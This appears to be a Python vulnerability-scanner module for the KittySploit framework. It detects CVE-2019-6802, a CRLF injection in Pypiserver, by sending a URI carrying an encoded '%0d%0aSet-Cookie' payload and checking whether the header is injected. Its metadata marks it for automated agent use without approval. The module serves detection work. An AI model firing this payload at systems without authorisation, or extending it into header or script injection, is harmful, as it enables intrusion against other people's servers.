#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pypiserver through 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Pypiserver <1.2.5 - Carriage Return Line Feed Injection Detection',
        'description': 'Pypiserver through 1.2.5 and below is susceptible to carriage return line feed injection. An attacker can set arbitrary HTTP headers and possibly conduct cross-site scripting attacks via a %0d%0a in a URI.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'crlf', 'pypiserver', 'python', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://vuldb.com/?id.130257',
            'https://github.com/pypiserver/pypiserver/issues/237',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-6802',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-6802',
    }

    def run(self):
        r = self.http_request(method="GET", path='/%0d%0aSet-Cookie:crlfinjection=1;', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_regexes = ('^Set-Cookie: crlfinjection=1;',)
        if (any(re.search(rx, headers, 0) for rx in header_regexes)):
            self.set_info(
                severity='medium',
                reason="Pypiserver <1.2.5 - Carriage Return Line Feed Injection detected",
                path='/%0d%0aSet-Cookie:crlfinjection=1;',
            )
            return True
        return False

